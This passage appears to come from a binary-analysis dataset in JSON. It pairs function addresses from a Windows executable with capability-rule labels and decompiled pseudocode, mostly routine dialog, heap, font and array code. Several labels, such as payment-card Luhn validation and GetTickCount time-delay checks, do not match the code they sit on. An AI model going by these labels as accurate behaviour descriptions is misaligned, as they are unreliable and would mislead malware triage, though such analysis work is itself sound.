iVar8;\n        if (iVar4 == 0) {\n            fcn.14001884c(auStack104, arg2);\n            fcn.140018750(auStack104);\n            iVar5 = fcn.140018320(auStack104);\n            fcn.140018308(auStack104);\n            if (iVar5 != 0) {\n                arg2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar5);\n            }\n        }\n        *(arg1 + 0x11) = 0xffffffff;\n        *(arg1 + 0xf) = *(arg1 + 0xf) | 0x10;\n        fcn.14000d690(arg1);\n        if (arg3 != 0) {\n            iVar8 = *(arg3 + 0x40);\n        }\n        iVar8 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)(arg4, arg2, iVar8, 0x14001381c, 0);\n        LOCK();\n        piVar1 = iStack128 + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        iStack120 = iVar8;\n        if (iVar4 + -1 < 1) {\n            (**(**(iStack128 + -0x18) + 8))();\n        }\n        if ((piVar2 != NULL) && (iVar8 != 0)) {\n            (**(*piVar2 + 0x30))(piVar2, auStack72);\n            (**(*arg1 + 0x268))(arg1, 0);\n        }\n        iVar4 = fcn.14000b4b4();\n        if (iVar4 == 0) {\n            (**(*arg1 + 0x238))(arg1);\n        }\n        if ((iVar8 != 0) && ((*(arg1 + 0xf) & 0x10) == 0)) {\n            (*_sym.imp.USER32.dll_DestroyWindow)(iVar8);\n            iVar8 = 0;\n        }\n        if (iVar5 != 0) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar5);\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(iVar5);\n        }\n        uVar7 = iVar8 != 0;\n    }\n    return uVar7;\n}\n",
        "token_count": 1023
    },
    "14001484": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "set registry value"
        ],
        "decompiled_code": "\nvoid fcn.14001484c(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uchar auStack120 [32];\n    uint *puStack88;\n    uint uStack80;\n    uint auStack72 [2];\n    uchar auStack64 [16];\n    uint64_t uStack48;\n    \n    uStack48 = *0x14003e1a0 ^ auStack120;\n    auStack72[0] = arg4;\n    if (*(arg1 + 0xa8) == 0) {\n        fcn.14001c5e4(auStack64, 0x10, 0x1400321cc, arg4);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(arg2, arg3, auStack64, *(arg1 + 0xd0));\n    }\n    else {\n        iVar1 = fcn.1400147d8(arg1, arg2);\n        if (iVar1 != 0) {\n            puStack88 = auStack72;\n            uStack80 = 4;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, arg3, 0);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.14001b410(uStack48 ^ auStack120);\n    return;\n}\n",
        "token_count": 307
    },
    "1400150f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.1400150f0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    iVar4 = *arg1;\n    uVar3 = 0;\n    if (iVar4 == 0) {\n        uVar3 = 0;\n    }\n    else if (iVar4 == arg2) {\n        if (arg2 == 0) {\n            fcn.140005e30();\n            pcVar2 = swi(3);\n            uVar3 = (*pcVar2)();\n            return uVar3;\n        }\n        *arg1 = *(arg2 + arg1[1]);\ncode_r0x000140015158:\n        uVar3 = 1;\n    }\n    else {\n        if (iVar4 == 0) {\n            fcn.140005e30();\n            pcVar2 = swi(3);\n            uVar3 = (*pcVar2)();\n            return uVar3;\n        }\n        do {\n            iVar1 = arg1[1];\n            if (*(iVar1 + iVar4) == arg2) {\n                if (arg2 == 0) {\n                    fcn.140005e30();\n                    pcVar2 = swi(3);\n                    uVar3 = (*pcVar2)();\n                    return uVar3;\n                }\n                *(iVar1 + iVar4) = *(iVar1 + arg2);\n                goto code_r0x000140015158;\n            }\n            iVar4 = *(iVar1 + iVar4);\n        } while (iVar4 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 361
    },
    "140015ce": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.140015ce4(int64_t *arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t arg4_00;\n    int64_t *piVar4;\n    uint64_t arg3_00;\n    \n    arg4_00 = 0;\n    if (arg3 < 0) {\n        arg3._0_4_ = 0;\n    }\n    arg3_00 = arg4;\n    if (arg4 < 0) {\n        arg3_00 = arg4_00;\n    }\n    if (0x7fffffff - arg3 < arg3_00) {\n        fcn.140001010(0x80070057);\n        pcVar2 = swi(3);\n        piVar4 = (*pcVar2)();\n        return piVar4;\n    }\n    iVar3 = *arg1;\n    iVar1 = *(iVar3 + -0x10);\n    if (iVar1 < arg3 + arg3_00) {\n        arg3_00 = iVar1 - arg3;\n    }\n    if (iVar1 < arg3) {\n        arg3_00 = arg4_00;\n    }\n    if ((arg3 == 0) && (arg3_00 == iVar1)) {\n        iVar3 = fcn.140002100(iVar3 + -0x18);\n        *arg2 = iVar3 + 0x18;\n    }\n    else {\n        if (*(iVar3 + -0x18) != NULL) {\n            arg4_00 = (**(**(iVar3 + -0x18) + 0x20))();\n        }\n        if (arg4_00 == 0) {\n            piVar4 = fcn.14000fd70();\n            arg4_00 = (**(*piVar4 + 0x20))(piVar4);\n        }\n        fcn.14000fe14(arg2, arg3 + *arg1, arg3_00, arg4_00);\n    }\n    return arg2;\n}\n",
        "token_count": 463
    },
    "140016d5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140016d54(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.140006c98();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x30) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.140005860(0x140016664);\n        arg1_01 = fcn.140005870(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.140016138(arg1_01, 0x140032560, 0x140016d3c, 0x140006f30);\n        }\n        *(iVar1 + 0x30) = uVar2;\n        fcn.140005860(arg1_00);\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 221
    },
    "14001704": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.14001704c(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    return *(iVar1 + 0x50) == 0;\n}\n",
        "token_count": 48
    },
    "14001813": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong * fcn.14001813c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    ulong *puVar2;\n    uint auStackX24 [2];\n    uint32_t auStackX32 [2];\n    \n    puVar2 = fcn.140017f58(arg1, arg2, auStackX32, auStackX24);\n    uVar1 = 0;\n    if (puVar2 == NULL) {\n        if (*(arg1 + 8) == 0) {\n            fcn.140017df4(arg1, *(arg1 + 0x10), 1);\n        }\n        puVar2 = fcn.140017eb4(arg1);\n        *(puVar2 + 1) = auStackX24[0];\n        if (arg2 != 0) {\n            uVar1 = fcn.14001bab0(arg2);\n        }\n        fcn.1400022f0(puVar2 + 2, arg2, uVar1);\n        *puVar2 = *(*(arg1 + 8) + auStackX32[0] * 8);\n        *(*(arg1 + 8) + auStackX32[0] * 8) = puVar2;\n    }\n    return puVar2 + 3;\n}\n",
        "token_count": 291
    },
    "14001875": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140018750(ulong arg1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint16_t in_DX;\n    char *arg2;\n    ulong in_R9;\n    uchar auStack136 [32];\n    int32_t iStack104;\n    char acStack76 [36];\n    uint64_t uStack40;\n    \n    uStack40 = *0x14003e1a0 ^ auStack136;\n    uVar1 = 10;\n    arg2 = \"System\";\n    iVar3 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.GDI32.dll_GetStockObject)(0xd);\n        if (iVar3 == 0) goto code_r0x00014001880d;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar3, 0x3c);\n    if (iVar2 != 0) {\n        arg2 = acStack76;\n        uVar4 = (*_sym.imp.USER32.dll_GetDC)();\n        if (iStack104 < 0) {\n            iStack104 = -iStack104;\n        }\n        (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar4, 0x5a);\n        uVar1 = (*_sym.imp.KERNEL32.dll_MulDiv)(iStack104, 0x48);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar4);\n    }\ncode_r0x00014001880d:\n    if (in_DX == 0) {\n        in_DX = uVar1;\n    }\n    fcn.140018550(arg1, arg2, in_DX, in_R9);\n    fcn.14001b410(uStack40 ^ auStack136);\n    return;\n}\n",
        "token_count": 418
    },
    "14001889": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140018898(uint32_t *arg1, int64_t *arg2, ushort *arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    ulong uVar6;\n    int16_t iVar7;\n    \n    iVar7 = -1;\n    if (*(arg1 + 2) == -1) {\n        uVar3 = arg1[3];\n    }\n    else {\n        uVar3 = *arg1;\n    }\n    if ((uVar3 & 0x40) == 0) {\n        uVar6 = 0;\n    }\n    else {\n        puVar5 = fcn.140018328(arg1);\n        *arg3 = *puVar5;\n        iVar4 = 1;\n        if (*(arg1 + 2) == iVar7) {\n            iVar4 = 3;\n        }\n        if ((1U - *(*arg2 + -8) | *(*arg2 + -0xc) - 0x20U) < 0) {\n            fcn.1400020a0(arg2, 0x20);\n        }\n        iVar1 = *arg2;\n        if (*(iVar1 + -0xc) < 0x20) {\n            fcn.140001010(0x80070057);\n            pcVar2 = swi(3);\n            uVar6 = (*pcVar2)();\n            return uVar6;\n        }\n        *(iVar1 + -0x10) = 0x20;\n        *(*arg2 + 0x20) = 0;\n        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar5 + iVar4 * 2, 0xffffffff, iVar1, 0x20, 0, 0);\n        iVar1 = *arg2;\n        if (iVar1 == 0) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = fcn.14001c284(iVar1, *(iVar1 + -0xc));\n            if (iVar4 < 0) goto code_r0x00014001899b;\n        }\n        if (*(*arg2 + -0xc) < iVar4) {\ncode_r0x00014001899b:\n            fcn.140001010(0x80070057);\n            pcVar2 = swi(3);\n            uVar6 = (*pcVar2)();\n            return uVar6;\n        }\n        *(*arg2 + -0x10) = iVar4;\n        *(iVar4 + *arg2) = 0;\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 595
    },
    "14001945": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140019450(int64_t arg1)\n\n{\n    code *pcVar1;\n    \n    if (0x3ffffffd < *(arg1 + 0x50)) {\n        fcn.140017da0(5, *(arg1 + 0x18));\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "14001947": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140019474(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    \n    iVar6 = 0;\n    if (arg2 < 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (-1 < arg3) {\n        *(arg1 + 0x20) = arg3;\n    }\n    iVar5 = *(arg1 + 8);\n    if (arg2 == 0) {\n        if (iVar5 != 0) {\n            if (0 < *(arg1 + 0x10)) {\n                do {\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < *(arg1 + 0x10));\n            }\n            fcn.1400058b4(iVar5);\n            *(arg1 + 8) = 0;\n        }\n        *(arg1 + 0x18) = 0;\n        *(arg1 + 0x10) = 0;\n        return;\n    }\n    if (iVar5 == 0) {\n        iVar4 = *(arg1 + 0x20);\n        if (*(arg1 + 0x20) < arg2) {\n            iVar4 = arg2;\n        }\n        arg1_00 = fcn.140005870(iVar4 << 2);\n        *(arg1 + 8) = arg1_00;\n        fcn.14001bd50(arg1_00, 0, iVar4 << 2);\n        if (0 < arg2) {\n            do {\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < arg2);\n        }\n    }\n    else {\n        iVar1 = *(arg1 + 0x18);\n        if (arg2 <= iVar1) {\n            iVar1 = *(arg1 + 0x10);\n            if (iVar1 < arg2) {\n                fcn.14001bd50(iVar5 + iVar1 * 4, 0, (arg2 - iVar1) * 4);\n                if (0 < arg2 - *(arg1 + 0x10)) {\n                    do {\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < arg2 - *(arg1 + 0x10));\n                }\n            }\n            else if ((arg2 < iVar1) && (0 < iVar1 - arg2)) {\n                do {\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < *(arg1 + 0x10) - arg2);\n            }\n            goto code_r0x000140019683;\n        }\n        iVar5 = *(arg1 + 0x20);\n        if (iVar5 == 0) {\n            iVar4 = *(arg1 + 0x10) + (*(arg1 + 0x10) >> 0x3f & 7) >> 3;\n            iVar5 = iVar4;\n            if (0x400 < iVar4) {\n                iVar5 = 0x400;\n            }\n            if (iVar4 < 4) {\n                iVar5 = 4;\n            }\n        }\n        iVar4 = arg2;\n        if (arg2 < iVar5 + iVar1) {\n            iVar4 = iVar5 + iVar1;\n        }\n        if (iVar4 < iVar1) {\n            fcn.140005e30();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        iVar5 = fcn.140005870(iVar4 << 2);\n        iVar3 = fcn.14001af18(iVar5, iVar4 << 2, *(arg1 + 8), *(arg1 + 0x10) << 2);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.140005de8();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.14001bd50(iVar5 + *(arg1 + 0x10) * 4, 0, (arg2 - *(arg1 + 0x10)) * 4);\n        if (0 < arg2 - *(arg1 + 0x10)) {\n            do {\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < arg2 - *(arg1 + 0x10));\n        }\n        fcn.1400058b4(*(arg1 + 8));\n        *(arg1 + 8) = iVar5;\n    }\n    *(arg1 + 0x18) = iVar4;\ncode_r0x000140019683:\n    *(arg1 + 0x10) = arg2;\n    return;\n}\n",
        "token_count": 1184
    },
    "1400197c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400197c0(code **arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    *arg1 = vtable.CArray_enum_CArchive::LoadArrayObjType__enum_CArchive::LoadArrayObjType_const____ptr64_.0;\n    if (arg1[1] != NULL) {\n        if (0 < arg1[2]) {\n            do {\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < arg1[2]);\n        }\n        fcn.1400058b4(arg1[1]);\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "14001a25": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * fcn.14001a25c(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    ulong uStackX8;\n    uint auStackX24 [2];\n    int64_t iStackX32;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.140017da0(4, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        piVar4 = (*pcVar2)();\n        return piVar4;\n    }\n    iVar5 = fcn.140019d48(arg1, arg2, auStackX24, &uStackX8);\n    if (iVar5 == 0) {\n        uVar6 = uStackX8 & 0xffffffff;\n        if (*(*(arg1 + 0x58) + 0x10) - 1U < uStackX8) {\n            fcn.140017da0(5, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            piVar4 = (*pcVar2)();\n            return piVar4;\n        }\n        uStackX8 = 0;\n        iVar3 = fcn.14001598c(*(arg1 + 0x60), 1, &uStackX8);\n        if (iVar3 != 0) {\n            if (uStackX8 == 0) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                piVar4 = (*pcVar2)();\n                return piVar4;\n            }\n            if (uStackX8 <= *(uStackX8 + 0x10) - 1U) {\n                if (*(uStackX8 + 0x10) <= uVar6) {\n                    fcn.140005e30();\n                    pcVar2 = swi(3);\n                    piVar4 = (*pcVar2)();\n                    return piVar4;\n                }\n                if (*(*(uStackX8 + 8) + uVar6 * 4) == 1) {\n                    fcn.140017da0(5, *(arg1 + 0x18));\n                    pcVar2 = swi(3);\n                    piVar4 = (*pcVar2)();\n                    return piVar4;\n                }\n            }\n        }\n        if (uVar6 < *(*(arg1 + 0x58) + 0x10)) {\n            piVar4 = *(*(*(arg1 + 0x58) + 8) + uVar6 * 8);\n            if (piVar4 == NULL) {\n                return NULL;\n            }\n            if (arg2 == 0) {\n                return piVar4;\n            }\n            iVar3 = fcn.140014a9c(piVar4, arg2);\n            if (iVar3 != 0) {\n                return piVar4;\n            }\n            fcn.140017da0(6, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            piVar4 = (*pcVar2)();\n            return piVar4;\n        }\n        iVar5 = fcn.140005e30();\n    }\n    piVar4 = fcn.140014a20(iVar5);\n    if (piVar4 == NULL) {\n        fcn.140005de8();\n    }\n    fcn.140019450(arg1);\n    fcn.14001a718(*(arg1 + 0x58), *(arg1 + 0x50), piVar4, 1);\n    iStackX32 = 0;\n    fcn.14001598c(*(arg1 + 0x60), 1, &iStackX32);\n    iVar5 = iStackX32;\n    if (iStackX32 == 0) {\n        fcn.140005e30();\n    }\n    uStackX8 = CONCAT44(uStackX8._4_4_, 2);\n    fcn.1400196a0(iVar5, *(arg1 + 0x50), &uStackX8, 1);\n    *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    uVar1 = *(arg1 + 0x14);\n    *(arg1 + 0x14) = auStackX24[0];\n    (**(*piVar4 + 0x10))(piVar4, arg1);\n    *(arg1 + 0x14) = uVar1;\n    return piVar4;\n}\n",
        "token_count": 1038
    },
    "14001ce5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.14001ce54(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uchar auStack40 [8];\n    int64_t iStack32;\n    int64_t iStack24;\n    char cStack16;\n    \n    fcn.14001be3c(auStack40, 0);\n    if (*(iStack32 + 8) == 0) {\n        iVar2 = fcn.140023ed0(arg1, arg2);\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    else if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar3 = fcn.14001bc68();\n        *puVar3 = 0x16;\n        fcn.14001ed34(0, 0, 0, 0);\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        iVar2 = 0;\n    }\n    else {\n        uVar1 = *arg1;\n        puVar5 = arg1;\n        while (uVar1 != 0) {\n            uVar1 = *arg2;\n            puVar4 = arg2;\n            while (uVar1 != 0) {\n                uVar1 = *puVar4;\n                if ((*(uVar1 + 0x1d + iStack32) & 4) == 0) {\n                    if (uVar1 == *puVar5) break;\n                }\n                else {\n                    if (((uVar1 == *puVar5) && (puVar4[1] == puVar5[1])) || (puVar4[1] == 0)) break;\n                    puVar4 = puVar4 + 1;\n                }\n                puVar4 = puVar4 + 1;\n                uVar1 = *puVar4;\n            }\n            if ((*puVar4 == 0) || (((*(*puVar5 + 0x1d + iStack32) & 4) != 0 && (puVar5 = puVar5 + 1,  *puVar5 == 0))))\n            break;\n            puVar5 = puVar5 + 1;\n            uVar1 = *puVar5;\n        }\n        iVar2 = puVar5 - arg1;\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 626
    },
    "14001cf7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.14001cf7c(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uchar auStack40 [8];\n    int64_t iStack32;\n    int64_t iStack24;\n    char cStack16;\n    \n    fcn.14001be3c(auStack40, 0);\n    if (*(iStack32 + 8) == 0) {\n        iVar2 = fcn.140023f84(arg1, arg2);\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    else if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar3 = fcn.14001bc68();\n        *puVar3 = 0x16;\n        fcn.14001ed34(0, 0, 0, 0);\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        iVar2 = 0;\n    }\n    else {\n        uVar1 = *arg1;\n        puVar5 = arg1;\n        while (uVar1 != 0) {\n            uVar1 = *arg2;\n            puVar4 = arg2;\n            while (uVar1 != 0) {\n                uVar1 = *puVar4;\n                if ((*(uVar1 + 0x1d + iStack32) & 4) == 0) {\n                    if (uVar1 == *puVar5) break;\n                }\n                else {\n                    if (((uVar1 == *puVar5) && (puVar4[1] == puVar5[1])) || (puVar4[1] == 0)) break;\n                    puVar4 = puVar4 + 1;\n                }\n                puVar4 = puVar4 + 1;\n                uVar1 = *puVar4;\n            }\n            if ((*puVar4 != 0) || (((*(*puVar5 + 0x1d + iStack32) & 4) != 0 && (puVar5 = puVar5 + 1,  *puVar5 == 0))))\n            break;\n            puVar5 = puVar5 + 1;\n            uVar1 = *puVar5;\n        }\n        iVar2 = puVar5 - arg1;\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 627
    },
    "14001d0d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14001d0d4(ulong arg1)\n\n{\n    ulong arg1_00;\n    \n    if (*0x140054248 == 0) {\n        arg1_00 = 0x14003eca0;\n    }\n    else {\n        arg1_00 = 0;\n    }\n    fcn.140024018(arg1_00, arg1, 0, 10);\n    return;\n}\n",
        "token_count": 93
    },
    "14000103": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * fcn.140001030(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uint16_t *puVar2;\n    uint64_t uVar3;\n    uint16_t *puVar4;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)();\n    if (iVar1 == 0) {\n        return NULL;\n    }\n    puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    if (puVar2 != NULL) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_SizeofResource)(arg1, arg2);\n        puVar4 = (uVar3 & 0xffffffff) + puVar2;\n        for (arg3._0_4_ = arg3 & 0xf; arg3 != 0; arg3._0_4_ = arg3 - 1) {\n            if (puVar4 <= puVar2) {\n                return NULL;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar4) {\n            if (*puVar2 == 0) {\n                return NULL;\n            }\n            return puVar2;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 282
    },
    "14001ba5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001ba54(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x140054200, 0, lpMem),  iVar2 == 0)) {\n        puVar1 = fcn.14001bc68();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.14001bc20(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "14000138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001380(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    \n    piVar1 = *(arg1 + 0x160);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n        *(arg1 + 0x160) = 0;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "140008d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140008d10(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    if (*(iVar1 + 0x60) != NULL) {\n        (**(iVar1 + 0x60))(arg2, arg1);\n    }\n    return 0;\n}\n",
        "token_count": 79
    },
    "14000168": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001680(int64_t arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    ulong uVar1;\n    ulong uVar2;\n    \n    arg1_00 = arg1 + 0x128;\n    uVar1 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 1);\n    fcn.1400077d0(arg1_00, uVar1);\n    uVar2 = 0;\n    uVar1 = uVar2;\n    if (arg1_00 != 0) {\n        uVar1 = *(arg1 + 0x130);\n    }\n    (*_sym.imp.GDI32.dll_CombineRgn)(uVar1, arg2, 0, 5);\n    *(arg1 + 0x124) = 1;\n    if (arg1_00 != 0) {\n        uVar2 = *(arg1 + 0x130);\n    }\n    // WARNING: Could not recover jumptable at 0x000140001710. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_SetWindowRgn)(*(arg1 + 0x40), uVar2, 0);\n    return;\n}\n",
        "token_count": 280
    },
    "14000219": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002190(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = *arg1;\n    LOCK();\n    piVar1 = iVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iVar3 + -0x18) + 8))();\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "1400021c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
